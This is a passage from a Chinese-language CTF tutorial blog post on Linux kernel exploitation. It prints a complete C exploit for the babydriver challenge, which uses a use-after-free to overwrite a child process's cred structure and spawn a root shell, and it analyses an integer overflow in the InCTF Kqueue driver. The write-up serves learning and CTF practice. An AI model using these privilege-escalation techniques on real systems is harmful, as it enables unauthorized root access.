      <url>/2023/02/28/Kernel-Pwn-%E5%85%A5%E9%97%A8-4/</url>
      
        <content type="html"><![CDATA[<h1 id="babydriver-的本来解法"><a href="#babydriver-的本来解法" class="headerlink" title="babydriver 的本来解法"></a>babydriver 的本来解法</h1><blockquote><p>摘自<a href="https://arttnba3.cn/2021/03/03/NOTE-0X03-LINUX-KERNEL-PWN-PART-II/">资料</a><br>这道题在当年的解法据悉是通过 UAF 修改该进程的 cred 结构体的 uid、gid 为0，十分简单十分白给<br>但是此种方法在较新版本 kernel 中已不可行，我们已无法直接分配到 cred_jar 中的 object，这是因为 cred_jar 在创建时设置了 SLAB_ACCOUNT 标记，不会再与相同大小的 kmalloc-192 进行合并</p></blockquote><p>为深入理解，笔者决定还是进行一番研究。<br>原来的利用思路中也包含了UAF，其意在通过UAF直接修改cred结构体，将uid和gid直接改为0。<br>下面是4.4.72版本中cred结构体的声明：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line"><span class="type">atomic_t</span>usage;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line"><span class="type">atomic_t</span>subscribers;<span class="comment">/* number of processes subscribed */</span></span><br><span class="line"><span class="type">void</span>*put_addr;</span><br><span class="line"><span class="type">unsigned</span>magic;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC0x43736564</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC_DEAD0x44656144</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">kuid_t</span>uid;<span class="comment">/* real UID of the task */</span></span><br><span class="line"><span class="type">kgid_t</span>gid;<span class="comment">/* real GID of the task */</span></span><br><span class="line"><span class="type">kuid_t</span>suid;<span class="comment">/* saved UID of the task */</span></span><br><span class="line"><span class="type">kgid_t</span>sgid;<span class="comment">/* saved GID of the task */</span></span><br><span class="line"><span class="type">kuid_t</span>euid;<span class="comment">/* effective UID of the task */</span></span><br><span class="line"><span class="type">kgid_t</span>egid;<span class="comment">/* effective GID of the task */</span></span><br><span class="line"><span class="type">kuid_t</span>fsuid;<span class="comment">/* UID for VFS ops */</span></span><br><span class="line"><span class="type">kgid_t</span>fsgid;<span class="comment">/* GID for VFS ops */</span></span><br><span class="line"><span class="type">unsigned</span>securebits;<span class="comment">/* SUID-less security management */</span></span><br><span class="line"><span class="type">kernel_cap_t</span>cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line"><span class="type">kernel_cap_t</span>cap_permitted;<span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line"><span class="type">kernel_cap_t</span>cap_effective;<span class="comment">/* caps we can actually use */</span></span><br><span class="line"><span class="type">kernel_cap_t</span>cap_bset;<span class="comment">/* capability bounding set */</span></span><br><span class="line"><span class="type">kernel_cap_t</span>cap_ambient;<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>jit_keyring;<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment"> * keys to */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line"><span class="type">void</span>*security;<span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span><span class="comment">/* real user ID subscription */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span><span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span><span class="title">rcu</span>;</span><span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>同样是两次打开设备，这里使用了fork函数产生了一个子进程，利用打开的设备修改子进程的cred结构体。至于为什么这里要使用fork函数，就需要了解一下fork函数的工作原理了。</p><blockquote><p>fork（）会产生一个和父进程完全相同的子进程，但子进程在此后多会exec系统调用，出于效率考虑，linux中引入了“写时复制“技术，也就是只有进程空间的各段的内容要发生变化时，才会将父进程的内容复制一份给子进程。在fork之后exec之前两个进程用的是相同的物理空间（内存区），子进程的代码段、数据段、堆栈都是指向父进程的物理空间，也就是说，两者的虚拟空间不同，但其对应的物理空间是同一个。当父子进程中有更改相应段的行为发生时，再为子进程相应的段分配物理空间，如果不是因为exec，内核会给子进程的数据段、堆栈段分配相应的物理空间（至此两者有各自的进程空间，互不影响），而代码段继续共享父进程的物理空间（两者的代码完全相同）。而如果是因为exec，由于两者执行的代码不同，子进程的代码段也会分配单独的物理空间。<br>————————————————<br>版权声明：本文为CSDN博主「狂奔的乌龟」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/xy010902100449/article/details/44851453">https://blog.csdn.net/xy010902100449/article/details/44851453</a></p></blockquote><p>当我们fork出一个子进程时，子进程的cred结构体指针与父进程的指针值是一样的，但实际指向的物理地址已经发生了改变。如果我们事先将buf的大小改为cred结构体的大小，那么在fork出子进程时，内核就会将子进程的cred结构体分配到buf的位置，我们也就能够对其进行随意修改。不过笔者尚未找到一种快捷的计算cred、tty_operations等这类结构体的大小，只能一个类型一个类型向前找定义。若读者有更好的方法，还请不吝赐教。</p><p>exp：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">int</span> f1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line"><span class="type">int</span> f2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">ioctl(f1, <span class="number">0x10001</span>, <span class="number">0xa8</span>);</span><br><span class="line">close(f1);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> pid = fork();</span><br><span class="line"><span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">28</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">write(f2, buf, <span class="number">28</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] The uid now is: %d.\033[0m\n&quot;</span>, getuid());</span><br><span class="line">system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(pid &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error: Failed to get root, exiting......\033[0m\n&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">wait(<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意：<strong>这里的wait(NULL)不可缺少</strong>，因为子进程不允许没有父进程存在，在子进程执行system时需要让父进程阻塞。如果没有这条语句，程序将会直接退出，子进程将会称为孤儿进程：</p><blockquote><p>（摘自<a href="https://blog.csdn.net/tennysonsky/article/details/45969569?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165136928416781432992726%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165136928416781432992726&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-45969569.142%5Ev9%5Econtrol,157%5Ev4%5Econtrol&utm_term=linux+%E5%AD%A4%E5%84%BF%E8%BF%9B%E7%A8%8B&spm=1018.2226.3001.4187">资料</a>）<br>孤儿进程是没有父进程的进程，为避免孤儿进程退出时无法释放所占用的资源而变为僵尸进程（什么是僵尸进程，请看<a href="https://blog.csdn.net/tennysonsky/article/details/45966571">《特殊进程之僵尸进程》</a>），进程号为 1 的 init 进程将会接受这些孤儿进程，这一过程也被称为“收养”。init 进程就好像是一个孤儿院，专门负责处理孤儿进程的善后工作。每当出现一个孤儿进程的时候，内核就把孤 儿进程的父进程设置为 init ，而 init 进程会循环地 wait() 它的已经退出的子进程。这样，当一个孤儿进程凄凉地结束了其生命周期的时候，init 进程就会代表党和政府出面处理它的一切善后工作。因此孤儿进程并不会有什么危害。</p></blockquote><p>父进程结束后，我们实际上就失去了对子进程的控制，这样即使子进程成功执行的system函数，我们也无法获取到root权限，因为此时父进程已经结束，我们现在直接控制的是1号进程，也就是系统进程，而系统进程中我们的权限仍然是受限的。</p><h1 id="Heap-Overflow"><a href="#Heap-Overflow" class="headerlink" title="Heap Overflow"></a>Heap Overflow</h1><p>说到内核的堆溢出，就不能不了解内核分配堆空间内存的方式。在kernel pwn题目中，内核堆空间分配最为常用的函数就是kmalloc函数了，与用户态的malloc函数相似，其也是传入一个需要申请的大小，返回申请到的地址值，但在kmalloc的底层则是slab&#x2F;slub系统和伙伴系统的协调合作。这里介绍一下最为简单的伙伴系统，slab系统择日再进行详细分析。</p><h2 id="伙伴系统（Buddy-System）"><a href="#伙伴系统（Buddy-System）" class="headerlink" title="伙伴系统（Buddy System）"></a>伙伴系统（Buddy System）</h2><p>伙伴系统用于管理以页为最小单位的内存空间，能够在一定程度上减少内存空间中的碎片。其维护需要一组链表，每一个链表中保存大小相同的连续内存块，这些内存块的大小为一页的2次幂。且所有内存块的起始地址必须是内存块自身大小的整数倍。<br><img src="https://img-blog.csdnimg.cn/a570d91393664fe38c1d7d6718f7f2a4.png"><br><img src="https://img-blog.csdnimg.cn/7f6e4311b56b4d6a9c026760f2d85b1b.png"><br>如上图所示，每一个小的正方形都表示一页，用红线划去的是不允许出现在伙伴系统中的块。上面的两个不允许出现的块都是因为其起始地址不能被自身大小所整除。</p><p>当需要分配2^n^个页大小的连续空间时，去链表组中检查保存2^n^页大小空间的链表中是否有块存在，如果存在则分配，若没有则查找2^n+1^的块是否存在，以此类推。</p><p><img src="https://img-blog.csdnimg.cn/a1571c106546445db3b5db47f3c7878e.png"><br>如上图中需要分配2页的连续空间，首先查找是否有2页的空闲空间块，发现没有，于是查找是否有4页的空闲空间块，还是没有，但是8页的空闲块有，于是分隔这个块，分割结果为：<br><img src="https://img-blog.csdnimg.cn/8a99307e06af42d2b3664ed4d3121baf.png"><br>这就是伙伴算法，伙伴系统就是基于伙伴算法实现的，整体上还是比较容易理解的。</p><h2 id="例题：InCTF-Kqueue"><a href="#例题：InCTF-Kqueue" class="headerlink" title="例题：InCTF-Kqueue"></a>例题：InCTF-Kqueue</h2><p>这道题给出了源码，我们可以首先阅读源码来分析整个驱动详细的执行流程。（登入用户名ctf、密码kqueue）</p><p>这个驱动只提供了一个接口：ioctl，有四个指令码，分别对应增删改查。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> CREATE_KQUEUE 0xDEADC0DE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EDIT_KQUEUE   0xDAADEEEE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELETE_KQUEUE 0xBADDCAFE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SAVE          0xB105BABE</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> noinline <span class="type">long</span> <span class="title function_">kqueue_ioctl</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">long</span> result;</span><br><span class="line"></span><br><span class="line">    <span class="type">request_t</span> request;</span><br><span class="line">    </span><br><span class="line">    mutex_lock(&amp;operations_lock);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (copy_from_user((<span class="type">void</span> *)&amp;request, (<span class="type">void</span> *)arg, <span class="keyword">sizeof</span>(<span class="type">request_t</span>)))&#123;</span><br><span class="line">        err(<span class="string">&quot;[-] copy_from_user failed&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(cmd)&#123;</span><br><span class="line">        <span class="keyword">case</span> CREATE_KQUEUE:</span><br><span class="line">            result = create_kqueue(request);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> DELETE_KQUEUE:</span><br><span class="line">            result = delete_kqueue(request);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> EDIT_KQUEUE:</span><br><span class="line">            result = edit_kqueue(request);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> SAVE:</span><br><span class="line">            result = save_kqueue_entries(request);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            result = INVALID;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">ret: </span><br><span class="line">    mutex_unlock(&amp;operations_lock);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先看一下create_kquque函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> noinline <span class="type">long</span> <span class="title function_">create_kqueue</span><span class="params">(<span class="type">request_t</span> request)</span>&#123;</span><br><span class="line">    <span class="type">long</span> result = INVALID;</span><br><span class="line"></span><br><span class="line"><span class="comment">// MAX_QUEUES = 5, 最多只能分配5块空间。</span></span><br><span class="line">    <span class="keyword">if</span>(queueCount &gt; MAX_QUEUES)</span><br><span class="line">        err(<span class="string">&quot;[-] Max queue count reached&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* You can&#x27;t ask for 0 queues , how meaningless */</span></span><br><span class="line">    <span class="keyword">if</span>(request.max_entries&lt;<span class="number">1</span>)</span><br><span class="line">        err(<span class="string">&quot;[-] kqueue entries should be greater than 0&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Asking for too much is also not good */</span></span><br><span class="line">    <span class="comment">// MAX_DATA_SIZE = 0x20, 大小不能超过0x20</span></span><br><span class="line">    <span class="keyword">if</span>(request.data_size&gt;MAX_DATA_SIZE)</span><br><span class="line">        err(<span class="string">&quot;[-] kqueue data size exceed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Initialize kqueue_entry structure */</span></span><br><span class="line">    queue_entry *kqueue_entry;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check if multiplication of 2 64 bit integers results in overflow */</span></span><br><span class="line">    ull space = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(__builtin_umulll_overflow(<span class="keyword">sizeof</span>(queue_entry),(request.max_entries+<span class="number">1</span>),&amp;space) == <span class="literal">true</span>)</span><br><span class="line">        err(<span class="string">&quot;[-] Integer overflow&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Size is the size of queue structure + size of entry * request entries */</span></span><br><span class="line">    ull queue_size = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(__builtin_saddll_overflow(<span class="keyword">sizeof</span>(<span class="built_in">queue</span>),space,&amp;queue_size) == <span class="literal">true</span>)</span><br><span class="line">        err(<span class="string">&quot;[-] Integer overflow&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Total size should not exceed a certain limit */</span></span><br><span class="line">    <span class="keyword">if</span>(queue_size&gt;<span class="keyword">sizeof</span>(<span class="built_in">queue</span>) + <span class="number">0x10000</span>)</span><br><span class="line">        err(<span class="string">&quot;[-] Max kqueue alloc limit reached&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* All checks done , now call kzalloc */</span></span><br><span class="line">    <span class="built_in">queue</span> *<span class="built_in">queue</span> = validate((<span class="type">char</span> *)kmalloc(queue_size,GFP_KERNEL));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Main queue can also store data */</span></span><br><span class="line">    <span class="built_in">queue</span>-&gt;data = validate((<span class="type">char</span> *)kmalloc(request.data_size,GFP_KERNEL));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Fill the remaining queue structure */</span></span><br><span class="line">    <span class="built_in">queue</span>-&gt;data_size   = request.data_size;</span><br><span class="line">    <span class="built_in">queue</span>-&gt;max_entries = request.max_entries;</span><br><span class="line">    <span class="built_in">queue</span>-&gt;queue_size  = queue_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Get to the place from where memory has to be handled */</span></span><br><span class="line">    kqueue_entry = (queue_entry *)((<span class="type">uint64_t</span>)(<span class="built_in">queue</span> + (<span class="keyword">sizeof</span>(<span class="built_in">queue</span>)+<span class="number">1</span>)/<span class="number">8</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Allocate all kqueue entries */</span></span><br><span class="line">    queue_entry* current_entry = kqueue_entry;</span><br><span class="line">    queue_entry* prev_entry = current_entry;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> i=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;request.max_entries+<span class="number">1</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i!=request.max_entries)</span><br><span class="line">            prev_entry-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">        current_entry-&gt;idx = i;</span><br><span class="line">        current_entry-&gt;data = (<span class="type">char</span> *)(validate((<span class="type">char</span> *)kmalloc(request.data_size,GFP_KERNEL)));</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Increment current_entry by size of queue_entry */</span></span><br><span class="line">        current_entry += <span class="keyword">sizeof</span>(queue_entry)/<span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Populate next pointer of the previous entry */</span></span><br><span class="line">        prev_entry-&gt;next = current_entry;</span><br><span class="line">        prev_entry = prev_entry-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Find an appropriate slot in kqueues */</span></span><br><span class="line">    <span class="type">uint32_t</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;MAX_QUEUES;j++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(kqueues[j] == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(j&gt;MAX_QUEUES)</span><br><span class="line">        err(<span class="string">&quot;[-] No kqueue slot left&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Assign the newly created kqueue to the kqueues */</span></span><br><span class="line">    kqueues[j] = <span class="built_in">queue</span>;</span><br><span class="line">    queueCount++;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* For Validating pointers */</span></span><br><span class="line"><span class="type">static</span> noinline <span class="type">void</span>* <span class="title function_">validate</span><span class="params">(<span class="type">void</span> *ptr)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!ptr)&#123;</span><br><span class="line">        mutex_unlock(&amp;operations_lock);</span><br><span class="line">        err(<span class="string">&quot;[-] oops! Internal operation error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意这个函数成功创建一个kqueue的标志是在全局变量kqueues中保存新创建的kqueue。其中kqueues最多可以容纳5个kqueue。<br>kmalloc中的第二个参数GFP_KERNEL是内存分配的一个选项，具体详见<a href="https://blog.csdn.net/u010164190/article/details/84789220?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165769965716781685380293%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165769965716781685380293&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-2-84789220-null-null.142%5Ev32%5Econtrol,185%5Ev2%5Econtrol&utm_term=gfp_kernel&spm=1018.2226.3001.4187">资料</a>。<br><code>__builtin_umulll_overflow</code>函数和<code>__builtin_saddll_overflow</code>函数是gcc中的内置函数，其作用是运算并检查是否溢出。在gcc中有一系列这样的函数，详情请见<a href="https://blog.csdn.net/weixin_43919932/article/details/123666702?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165769979316780357217968%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=165769979316780357217968&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-2-123666702-null-null.142%5Ev32%5Econtrol,185%5Ev2%5Econtrol&utm_term=__builtin_umulll_overflow&spm=1018.2226.3001.4187">资料</a>。实际上函数的功能可以通过其名字得知。如<code>__builtin_umulll_overflow</code>中<code>umulll</code>的第一个u指的是无符号整数运算，mul是乘法，后面的ll是整数类型（长整型）。类似的，<code>__builtin_saddll_overflow</code>指的是有符号（s）长整型（ll）加法（add）。由此可知每一次添加kqueue，其第一个kmalloc分配的大小应该为<code>sizeof(queue) + sizeof(queue_entry) * max_entries</code>，其中max_entries代表这个队列可容纳的最大的元素个数。结构体<code>queue</code>中保存队列的基本信息，结构体<code>queue_entry</code>保存队列中一个元素的信息，每一个元素都是一个字符串，字符串的长度由传入的请求<code>request.data_size</code>决定，即一个队列中保存所有字符串的内存块大小相等。<br>另外注意如果请求分配n个queue_entry，这个函数实际上会给你分配出n+1个entry的空间，也就是调用<code>__builtin_saddll_overflow</code>函数时乘以<code>request.max_entries+1</code>。<code>__builtin_saddll_overflow</code>函数虽然会检查乘法是否有溢出，但不能检查<code>request.max_entries+1</code>这个加法会不会溢出。如果传入的<code>request.max_entries=0xFFFFFFFF</code>，加1变成0，乘法绝对不会溢出，但这个值0xFFFFFFFF会保存到<code>queue.max_entries</code>之中，有潜在的隐患。这个时候后面的申请entries的循环一次都不会执行，即一共只分配了0x20大小（注意结构体中元素的对齐）的空间用于存放queue而没有分配空间用于queue_entry。</p><p>delete_kqueue函数即将空间释放，内容清零。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> noinline <span class="type">long</span> <span class="title function_">delete_kqueue</span><span class="params">(<span class="type">request_t</span> request)</span>&#123;</span><br><span class="line">    <span class="comment">/* Check for out of bounds requests */</span></span><br><span class="line">    <span class="keyword">if</span>(request.queue_idx&gt;MAX_QUEUES)</span><br><span class="line">        err(<span class="string">&quot;[-] Invalid idx&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check for existence of the request kqueue */</span></span><br><span class="line">    <span class="built_in">queue</span> *<span class="built_in">queue</span> = kqueues[request.queue_idx];</span><br><span class="line">    <span class="keyword">if</span>(!<span 